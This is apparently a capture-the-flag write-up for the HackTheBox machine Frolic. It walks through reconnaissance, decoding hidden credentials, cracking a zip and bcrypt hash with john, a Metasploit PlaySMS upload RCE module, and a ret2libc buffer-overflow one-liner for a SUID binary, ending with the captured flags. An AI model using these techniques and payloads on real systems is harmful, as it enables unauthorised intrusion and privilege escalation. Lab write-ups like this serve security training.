# Frolic
## HackTheBox
### Easy (retired)

IP: 10.129.1.92
Host:

### NMAP
 * 22/tcp   OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
 * 139/tcp  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 * 445/tcp  Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
 * 1880/tcp Node.js (Express middleware)
    http-favicon: Unknown favicon MD5: 818DD6AFD0D0F9433B21774F89665EEA
    http-title: Node-RED
    http-methods:
      Supported Methods: GET HEAD POST OPTIONS
 * 9999/tcp open  http        syn-ack ttl 63 nginx 1.10.3 (Ubuntu)
    http-server-header: nginx/1.10.3 (Ubuntu)
    http-title: Welcome to nginx!
    http-methods:
      Supported Methods: GET HEAD

Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
  clock-skew: mean: -1h49m59s, deviation: 3h10m30s, median: 0s
  smb2-security-mode:
    3.1.1:
      Message signing enabled but not required
  nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
  Names:
    FROLIC<00>           Flags: <unique><active>
    FROLIC<03>           Flags: <unique><active>
    FROLIC<20>           Flags: <unique><active>
    WORKGROUP<00>        Flags: <group><active>
    WORKGROUP<1e>        Flags: <group><active>
  Statistics:
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00 00 00 00 00 00 00
  smb2-time:
    date: 2021-10-15T01:35:56
    start_date: N/A
  smb-security-mode:
    account_used: guest
    authentication_level: user
    challenge_response: supported
    message_signing: disabled (dangerous, but default)
  smb-os-discovery:
    OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
    Computer name: frolic
    NetBIOS computer name: FROLIC\x00
    Domain name: \x00
    FQDN: frolic
    System time: 2021-10-15T07:05:56+05:30

### Directories
```Console
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.1.92:1880/
 📖  Wordlist              │ /SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💾  Output File           │ dirs/initialDirs.log
 💲  Extensions            │ [php, txt, html]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
401        1l        1w       12c http://10.129.1.92:1880/icons
301       10l       16w      173c http://10.129.1.92:1880/red
301       10l       16w      187c http://10.129.1.92:1880/red/images
200     1335l     9126w    54818c http://10.129.1.92:1880/red/about
301       10l       16w      179c http://10.129.1.92:1880/vendor
401        1l        1w       12c http://10.129.1.92:1880/settings
401        1l        1w       12c http://10.129.1.92:1880/Icons
301       10l       16w      187c http://10.129.1.92:1880/vendor/ace
401        1l        1w       12c http://10.129.1.92:1880/nodes
200       24l      220w     1490c http://10.129.1.92:1880/vendor/ace/LICENSE
301       10l       16w      205c http://10.129.1.92:1880/vendor/ace/snippets
401        1l        1w       12c http://10.129.1.92:1880/SETTINGS
301       10l       16w      199c http://10.129.1.92:1880/vendor/bootstrap
301       10l       16w      207c http://10.129.1.92:1880/vendor/bootstrap/img
301       10l       16w      207c http://10.129.1.92:1880/vendor/bootstrap/css
401        1l        1w       12c http://10.129.1.92:1880/flows
301       10l       16w      193c http://10.129.1.92:1880/vendor/jquery
301       10l       16w      201c http://10.129.1.92:1880/vendor/jquery/css
401        1l        1w       12c http://10.129.1.92:1880/ICONS

───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.1.92:9999/
 📖  Wordlist              │ /Volumes/TerraRyzing/Tools/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💾  Output File           │ dirs/nginxport9999Dirs.log
 💲  Extensions            │ [php, txt, html]
───────────────────────────┴──────────────────────
301        7l       13w      194c http://10.129.1.92:9999/admin
200       25l       63w      634c http://10.129.1.92:9999/admin/index.html
301        7l       13w      194c http://10.129.1.92:9999/test
301        7l       13w      194c http://10.129.1.92:9999/admin/css
301        7l       13w      194c http://10.129.1.92:9999/dev
200     1006l     5029w        0c http://10.129.1.92:9999/test/index.php
301        7l       13w      194c http://10.129.1.92:9999/admin/js
200        1l        1w        5c http://10.129.1.92:9999/dev/test
200       22l      255w     1529c http://10.129.1.92:9999/admin/success.html
301        7l       13w      194c http://10.129.1.92:9999/backup
200        3l        3w        0c http://10.129.1.92:9999/backup/index.php
200        1l        3w       13c http://10.129.1.92:9999/backup/user.txt
200        1l        3w       22c http://10.129.1.92:9999/backup/password.txt
301        7l       13w      194c http://10.129.1.92:9999/dev/backup
200        3l        1w        0c http://10.129.1.92:9999/dev/backup/index.php
301        7l       13w      194c http://10.129.1.92:9999/loop
301        7l       13w      194c http://10.129.1.92:9999/backup/loop
301        7l       13w      194c http://10.129.1.92:9999/loop/loop
301        7l       13w      194c http://10.129.1.92:9999/loop/loop/loop
301        7l       13w      194c http://10.129.1.92:9999/loop/loop/loop/loop
```

### Samba
Using enum4linux:
```Console
 ========================================
|    RPC Session Check on 10.129.1.92    |
 ========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user session
[+] Server allows session using username 'aqpacwth', password ''
```

Nothing notable with SMB.

### http://frolic.htb:9999/
Found the following credentials in 'user.txt' and 'password.txt'
user - admin
password - imnothuman
 * does not work in the /admin page
 * does not work on SSH
 * Does not work at frolic.htb:1880/
http://frolic.htb:9999/dev/backup/index.php
 * `/playsms`
 * routes to `http://10.129.1.92:9999/playsms/index.php?app=main&inc=core_auth&route=login`: a `playsms` login

### http://10.129.1.92:9999/admin/
Asks for the login to be hacked.
Checked source code of the page and found a link to the file `login.js`
```javascript
var attempt = 3; // Variable to count number of attempts.
// Below function Executes on click of login button.
function validate(){
var username = document.getElementById("username").value;
var password = document.getElementById("password").value;
if ( username == "admin" && password == "superduperlooperpassword_lol"){
	alert ("Login successfully");
	window.location = "success.html"; // Redirecting to other page.
 	return false;
   }
    else{
	attempt --;// Decrementing by one.
	alert("You have left "+attempt+" attempt;");
	// Disabling fields after 3 attempts.
    if( attempt == 0){
	document.getElementById("username").disabled = true;
	document.getElementById("password").disabled = true;
	document.getElementById("submit").disabled = true;
    return false;
   }
  }
}
```
username: admin
password: superduperlooperpassword_lol

Leads to http://10.129.1.92:9999/admin/success.html which is a combinations of `. ? !`
 * This is apparently a version of `brainfuck` called `ook`

| Brainfuck  |   Ook! 	   |    Description
|------------|-------------|----------------------------------------------------------------------------|
|  > 	     |   Ook. Ook? | 	Move the pointer to the right                                           |
|  < 	     |   Ook? Ook. | 	Move the pointer to the left                                            |
|  + 	     |   Ook. Ook. | 	Increment the memory cell under the pointer                             |
|  - 	     |   Ook! Ook! | 	Decrement the memory cell under the pointer                             |
|  . 	     |   Ook! Ook. | 	Output the character signified by the cell at the pointer               |
|  , 	     |   Ook. Ook! | 	Input a character and store it in the cell at the pointer               |
|  [ 	     |   Ook! Ook? | 	Jump past the matching Ook? Ook! if the cell under the pointer is 0     |
|  ] 	     |   Ook? Ook! | 	Jump back to the matching Ook! Ook?

Code doesn't decode with `ooked.py` script (saved in /etc)

Used `cURL` to connect the code into a single string.
`python3 ook.py <(curl -s http://10.129.1.92:9999/admin/success.html | tr -d ' ' | tr -d '\n') ookedSuccess`
  * Decoded on [dcode.fr](https://www.dcode.fr/ook-language)
  * output: `Nothing here check /asdiSIAJJ0QWE9JAS`
  * Visited http://frolic.htb:9999/asdiSIAJJ0QWE9JAS
  * reached a page of code (stored in /etc/nothingtosee)

```Console
UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB
BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs
K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve
EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj
lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC
AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG
AAAAAAEAAQBPAAAAAwEAAAAA
```

Cyberchef can't magic it.
Not a hash according to `nth`

This worked:
```Console
╰─ cat nothingToSee | base64 -d | xxd 
00000000: 504b 0304 1400 0900 0800 c389 374d 23fe  PK..........7M#.
00000010: 5b14 b000 0000 6902 0000 0900 1c00 696e  [.....i.......in
00000020: 6465 782e 7068 7055 5409 0003 857c a75b  dex.phpUT....|.[
00000030: 857c a75b 7578 0b00 0104 0000 0000 0400  .|.[ux..........
00000040: 0000 005e 44e6 104a 9f73 b268 8a29 9a1b  ...^D..J.s.h.)..
00000050: 9550 f06e 0ba9 bf53 73e4 024a 771a 11dc  .P.n...Ss..Jw...
00000060: 8ee5 a034 e2f6 d98f 6bee 7ad0 128a 55c8  ...4....k.z...U.
00000070: 96ec 2b58 ba7f e050 c8e1 12e1 b687 a4ea  ..+X...P........
00000080: d0bb e278 5f13 c04e 895b fd8d 8453 aaea  ...x_..N.[...S..
00000090: 38f2 83f2 e20f 914a 3253 c72a 8303 44d0  8......J2S.*..D.
000000a0: 8d7d 9338 6454 0e51 026b de10 cad7 e3e4  .}.8dT.Q.k......
000000b0: fb6a 5f9f 8bf9 18e9 94c0 2778 7f63 90c2  .j_.......'x.c..
000000c0: 16dd 8f74 beb2 3735 51ac 0b9a 8a03 0e95  ...t..75Q.......
000000d0: 106b 032c 34b5 d962 29be 3446 b5e9 0609  .k.,4..b).4F....
000000e0: ffba 84e3 96ea e9ef c726 7132 6f88 57d4  .........&q2o.W.
000000f0: 9ce3 3950 4b07 0823 fe5b 14b0 0000 0069  ..9PK..#.[.....i
00000100: 0200 0050 4b01 021e 0314 0009 0008 00c3  ...PK...........
00000110: 8937 4d23 fe5b 14b0 0000 0069 0200 0009  .7M#.[.....i....
00000120: 0018 0000 0000 0001 0000 00a4 8100 0000  ................
00000130: 0069 6e64 6578 2e70 6870 5554 0500 0385  .index.phpUT....
00000140: 7ca7 5b75 780b 0001 0400 0000 0004 0000  |.[ux...........
00000150: 0000 504b 0506 0000 0000 0100 0100 4f00  ..PK..........O.
00000160: 0000 0301 0000 0000
```

The far right column starts with `PK` which is a sign of a "zip file format and formats based on it, such as EPUB, JAR, ODF, OOXML" according to [Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)
 * Changed file format to .zip

Used `wget` to pull the file to my machine and passed it to `base64 -d`, then dumped it into a file
`╰─ curl -s http://frolic.htb:9999/asdiSIAJJ0QWE9JAS/ | base64 -d > somethingToSee.zip`

```Console
╰─ file somethingToSee.zip 
somethingToSee.zip: Zip archive data, at least v2.0 to extract

╰─ unzip somethingToSee.zip 
Archive:  somethingToSee.zip
[somethingToSee.zip] index.php password:
```

I don't have a password for this one. Time to crack it with `zip2john`.
 * output: password
```Console
user@parrot:~/Desktop/HtB$ zip2john somethingToSee.zip > hash
ver 2.0 efh 5455 efh 7875 somethingToSee.zip/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=176, decmplen=617, crc=145BFE23
user@parrot:~/Desktop/HtB$ ls
hash  somethingToSee.zip
user@parrot:~/Desktop/HtB$ cat hash
somethingToSee.zip/index.php:$pkzip2$1*2*2*0*b0*269*145bfe23*0*43*8*b0*145b*89c3*5e44e6104a9f73b2688a299a1b9550f06e0ba9bf5373e4024a771a11dc8ee5a034e2f6d98f6bee7ad0128a55c896ec2b58ba7fe050c8e112e1b687a4ead0bbe2785f13c04e895bfd8d8453aaea38f283f2e20f914a3253c72a830344d08d7d933864540e51026bde10cad7e3e4fb6a5f9f8bf918e994c027787f6390c216dd8f74beb2373551ac0b9a8a030e95106b032c34b5d96229be3446b5e90609ffba84e396eae9efc72671326f8857d49ce339*$/pkzip2$:index.php:somethingToSee.zip::somethingToSee.zip
user@parrot:~/Desktop/HtB$ john hash --wordlist=/usr/share/SecLists-master/Passwords/Leaked-Databases/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password         (somethingToSee.zip/index.php)
1g 0:00:00:00 DONE (2021-10-15 08:05) 50.00g/s 409600p/s 409600c/s 409600C/s 123456..total90
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Unzipped file with the password: password
Creates `index.php` with the following content:
```Console
4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
```
  * hex code. To cyberchef!
  * returns base64 string:
```Console
KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr
KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg
K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t
LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==
```
  * piping it through `base64 -d` returns unreadable code. Converted the base64 and it returned this:
``` Console
+++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
++..<
```
 * it's Brainfuck!
 * decodes as: idkwhatispass

Logged into http://10.129.1.92:9999/playsms/index.php?app=main&inc=core_auth&route=login with the following creds:
User:admin
password: idkwhatispass

### http://10.129.1.92:9999/playsms/index.php?app=main&inc=core_welcome
Found this in the HTML source:
`<!-- kurakura cinta kamu.......sampai mati... -->`
 * 'tortoise love you......until death...'

Play SMS has an RCE vulnerability in its file upload for the calendar page
 * used `msfconsole` exploit `multi/http/playsms_uploadcsv_exec`


### Logged in as www-data: pivot
Located admin creds for `node-red` below in 
```Console
// Securing Node-RED
// -----------------
// To password protect the Node-RED editor and admin API, the following
// property can be used. See http://nodered.org/docs/security.html for details.
adminAuth: {
    type: "credentials",
    users: [{
        username: "admin",
        password: "$2a$08$M6GkqpR1GdCDkQYXsR4zGOCl4gA/vWgNBSNKzCRr2RFKyYJNf08q.",
        permissions: "*"
    }]
},
```
 * this is BCrypt which is notoriously difficulty to brute force. John found it in a few seconds using the `rockyou.txt` wordlist
   * password: password

Can't log into node-red page. Try something else!

### User flag
Poked around in the user files and got access to user.txt without having to pivot into `ayush`
User flag: 2ab95909cf509f85a6f476b59a0c2fe0

### Back to Pivot/privesc as www-data
```Console
www-data@frolic:/home$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/sbin/mount.cifs
/bin/mount
/bin/ping6
/bin/fusermount
/bin/ping
/bin/umount
/bin/su
/bin/ntfs-3g
/home/ayush/.binary/rop
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/at
/usr/bin/sudo
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/chfn
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/i386-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```
 * `/home/ayush/.binary/rop` sticks out
```Console
file rop
rop: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=59da91c100d138c662b77627b65efbbc9f797394, not stripped
www-data@frolic:/home/ayush/.binary$ ./rop
./rop
[*] Usage: program <message>
```
  * Buffer overflow?
  * let's test it!

```Console
www-data@frolic:/home/ayush/.binary$ ldd rop
ldd rop
	linux-gate.so.1 =>  (0xb7fda000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
	/lib/ld-linux.so.2 (0xb7fdb000)
www-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep " system@"
grep " system@"/i386-linux-gnu/libc.so.6 |
  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
www-data@frolic:/home/ayush/.binary$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
.6 | grep /bin/shlib/i386-linux-gnu/libc.so
 15ba0b /bin/s
 www-data@frolic:/home/ayush/.binary$ ./rop $(python -c 'print("a"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7" + "\x0b\x4a\xf7\xb7")')
<d\xe5\xb7" + "\xd0\x79\xe4\xb7" + "\x0b\x4a\xf7\xb7")')
```

I know next to nothing about binary exploitation, so I stole this from a writeup:
```console
www-data@frolic:/home/ayush/.binary$ ./rop $(python -c 'print("a"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7" + "\x0b\x4a\xf7\xb7")')
<d\xe5\xb7" + "\xd0\x79\xe4\xb7" + "\x0b\x4a\xf7\xb7")')
```

Rooted!
Root flag: 85d3fdf03f969892538ba9a731826222
